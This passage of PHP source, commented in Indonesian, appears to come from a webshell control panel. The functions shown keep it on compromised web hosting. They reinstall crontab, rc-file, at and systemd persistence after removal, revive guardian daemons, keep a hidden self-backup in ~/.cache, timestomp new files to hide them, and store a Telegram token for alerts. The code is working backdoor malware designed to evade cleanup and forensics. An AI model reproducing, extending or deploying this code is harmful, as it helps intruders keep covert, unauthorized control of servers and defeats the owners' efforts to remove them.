}
/* WEB-HIT DOCTOR (channel b): dipanggil fum_selfheal tiap panel dibuka.
   Cek marker crontab vs manifest; tidak cocok = kena crontab -r ->
   rebuild SEMUA channel + revive guardian/daemon INSTAN (bukan cuma
   pasang 1 entri cron). Throttle 60 dtk supaya request tetap <25 dtk. */
function gsp_imm_doctor() {
    $m = gsp_imm_load();
    if (!is_array($m)) return; // tidak ARMED -> tidak melakukan apa pun
    $stamp = gsp_imm_stpath() . '.web';
    $last = @filemtime($stamp);
    if ($last !== false && (time() - $last) < 60) return;
    @touch($stamp);
    // guard/checker/at-script hilang -> tulis ulang dari manifest
    if (!@is_file($m['guard']) && @is_file(fum_store_path()) && function_exists('fum_guard_write')) fum_guard_write();
    if (!@is_file($m['checker'])) { @file_put_contents($m['checker'], gsp_imm_checker_src($m)); @chmod($m['checker'], 0700); gsp_stealth_age($m['checker']); }
    if (!@is_file($m['at'])) { @file_put_contents($m['at'], gsp_imm_at_src($m)); @chmod($m['at'], 0700); gsp_stealth_age($m['at']); }
    $have = gsp_imm_cron_has_marker();
    if ($have !== false) return; // true = utuh; null = tak bisa memastikan (konservatif, jangan rebuild buta)
    // marker crontab TIDAK cocok dengan manifest -> REBUILD PENUH semua channel
    gsp_imm_cron_install($m);
    gsp_imm_rc_on($m);
    gsp_imm_at_arm($m);
    if (!empty($m['sdok'])) gsp_imm_sd_arm($m);
    gsp_imm_revive($m); // revive guardian+daemon instan, tidak menunggu cron
    gsp_imm_state_set('RB', time());
}
/* status per channel untuk UI panel */
function gsp_imm_status() {
    $m = gsp_imm_load();
    $st = gsp_imm_state();
    $out = array('armed' => is_array($m), 'id' => gsp_imm_id(), 'ch' => array(), 'rb' => 0, 'ts' => 0);
    if (isset($st['RB'])) $out['rb'] = intval($st['RB']);
    if (isset($st['TS'])) $out['ts'] = intval($st['TS']);
    if (!$out['armed']) return $out;
    $cron = gsp_imm_cron_has_marker();
    $out['ch']['cron'] = ($cron === true) ? 1 : 0;
    $out['ch']['checker'] = @is_file($m['checker']) ? 1 : 0;
    $nrc = 0;
    foreach (gsp_imm_rc_files() as $rc) if (@is_file($rc) && strpos(strval(@file_get_contents($rc)), gsp_imm_rc_hook_mark($m['id'])) !== false) $nrc++;
    $out['ch']['rc'] = $nrc;
    if (!empty($m['atok']) || gsp_imm_at_available()) {
        $alive = 0;
        $atj = isset($st['AT']) ? intval($st['AT']) : 0;
        if ($atj > 0 && function_exists('gsp_shell_ok') && gsp_shell_ok()) {
            $o = gsp_sh('atq 2>/dev/null');
            foreach (explode("\n", $o) as $ln) if (intval(trim($ln)) === $atj) { $alive = 1; break; }
        }
        $out['ch']['at'] = $alive;
    } else $out['ch']['at'] = -1; // N/A di hosting ini
    if (!empty($m['sdok']) && function_exists('gsp_shell_ok') && gsp_shell_ok()) {
        $o = gsp_sh('timeout 6 systemctl --user is-enabled ' . escapeshellarg($m['sd'] . '.timer') . ' 2>/dev/null');
        $out['ch']['systemd'] = (strpos($o, 'enabled') !== false) ? 1 : 0;
    } else $out['ch']['systemd'] = -1;
    return $out;
}

/* ================= v65.8: SELF-REPAIR + TELEGRAM + LOG/HISTORY CLEANER + PING =================
   Semua artefak baru lewat gsp_stealth_age; rc & file yang diedit in-place
   lewat gsp_rc_write_stealth (mtime asli dijaga). Exec hanya via helper
   existing (fum_run_cmd). PHP 4.x s/d 8.5. */
/* domain saat ini untuk pesan Telegram & manifest: HTTP_HOST (tanpa port),
   fallback hostname shell */
function gsp_self_host() {
    $h = isset($_SERVER['HTTP_HOST']) ? trim(strval($_SERVER['HTTP_HOST'])) : '';
    $h = preg_replace('/:\d+$/', '', $h);
    if ($h !== '') return $h;
    $h = safe_exec('hostname');
    return ($h !== '') ? $h : 'unknown';
}
/* hash ping deterministik: sha1(id immortal | secret instance pertama
   registry; fallback path panel). Bukan kredensial — hanya penanda bahwa
   pemanggil bisa membaca secret/path yang sama dengan panel. */
function gsp_ping_hash() {
    $sec = '';
    if (function_exists('gsp_registry')) {
        $reg = gsp_registry();
        foreach ($reg as $e) {
            if (isset($e['SECRET']) && $e['SECRET'] !== '') { $sec = $e['SECRET']; break; }
        }
    }
    if ($sec === '') $sec = strval(__FILE__);
    return sha1(gsp_imm_id() . '|' . $sec);
}

/* ---------- SELF-REPAIR panel (via checker shell) ---------- */
function gsp_selfbak_path() { return gsp_imm_dir() . '/.gsp_selfbak'; }
/* tulis/refresh backup diri ke ~/.cache/.gsp_selfbak + isi field host &
   self_* ke manifest $m (by-ref, hash dihitung ulang). SELF-UPDATE AWARE:
   md5 berubah -> backup ditulis ulang. Dipanggil saat ARM (gsp_imm_arm),
   tiap request normal (gsp_selfbak_tick), dan WAJIB dipanggil lagi setelah
   panel sukses menulis dirinya sendiri (self-update di masa depan). */
function gsp_selfbak_update(&$m) {
    $self = strval(__FILE__);
    $bak  = gsp_selfbak_path();
    $md5  = @md5_file($self);
    $size = @filesize($self);
    $fresh = (@is_file($bak) && $md5 !== false && @md5_file($bak) === $md5);
    if (!$fresh && @copy($self, $bak)) {
        @chmod($bak, 0600);
        gsp_stealth_age($bak);
        $fresh = true;
    }
    if (is_array($m)) {
        $m['host']      = gsp_self_host();
        $m['self_path'] = str_replace("'", '', $self);
        $m['self_md5']  = ($md5 !== false) ? $md5 : '';
        $m['self_size'] = ($size !== false) ? intval($size) : 0;
        $m['hash']      = gsp_imm_hash($m);
    }
    return $fresh;
}
/* denyut sekali per request normal (murah: 2x md5_file): panel berubah
   (self-update) -> backup & field manifest disegarkan. Belum ARMED ->
   backup tetap disegarkan, manifest tidak disentuh. */
function gsp_selfbak_tick() {
    if (function_exists('gsp_noselfbak_on') && gsp_noselfbak_on()) return; // v65.9: selfbak off (checkbox / MODE BUANG PANEL)
    $md5 = @md5_file(strval(__FILE__));
    if ($md5 === false) return;
    $bak = gsp_selfbak_path();
    $stale = (!@is_file($bak) || @md5_file($bak) !== $md5);
    $m = gsp_imm_load();
    if (is_array($m)) {
        if ($stale || !isset($m['self_md5']) || $m['self_md5'] !== $md5 || !isset($m['host']) || $m['host'] === '') {
            gsp_selfbak_update($m);
            gsp_imm_save($m);
        }
    } elseif ($stale) {
        if (@copy(strval(__FILE__), $bak)) { @chmod($bak, 0600); gsp_stealth_age($bak); }
    }
}
/* status untuk UI: backup ada/tidak, md5 cocok?, tercatat di manifest? */
function gsp_selfbak_status() {
    $o = array('bak' => @is_file(gsp_selfbak_path()), 'match' => false, 'in_manifest' => false);
    $m = gsp_imm_load();
    if (is_array($m) && isset($m['self_md5']) && $m['self_md5'] !== '') $o['in_manifest'] = true;
    if ($o['bak']) {
        $a = @md5_file(strval(__FILE__));
        $b = @md5_file(gsp_selfbak_path());
        $o['match'] = ($a !== false && $a === $b);
    }
    return $o;
}

/* ---------- TELEGRAM ALERT ---------- */
function gsp_tg_path()   { return gsp_imm_dir() . '/.gsp_tg'; }     // config TOKEN/CHATID (0600)
function gsp_tg_rlpath() { return gsp_imm_dir() . '/.gsp_tg_rl'; }  // rate-limit JENIS=epoch (dipakai checker shell)
function gsp_tg_load() {
    $out = array('TOKEN' => '', 'CHATID' => '');
    $rows = @file(gsp_tg_path());
    if (is_array($rows)) foreach ($rows as $ln) {
        $ln = trim($ln, "\r\n");
        if ($ln === '') continue;
        $kv = explode('=', $ln, 2);
        if (count($kv) === 2 && isset($out[$kv[0]])) $out[$kv[0]] = trim($kv[1]);
    }
    return $out;
}
/* simpan config (0600 + timestomp); token kosong = fitur mati -> file dihapus */
function gsp_tg_save($tok, $cid) {
    $tok = trim($tok); $cid = trim($cid);
    if ($tok === '') { @unlink(gsp_tg_path()); return true; }
    $ok = @file_put_contents(gsp_tg_path(), 'TOKEN=' . $tok . "\n" . 'CHATID=' . $cid . "\n");
    if ($ok !== false) { @chmod(gsp_tg_path(), 0600); gsp_stealth_age(gsp_tg_path()); return true; }
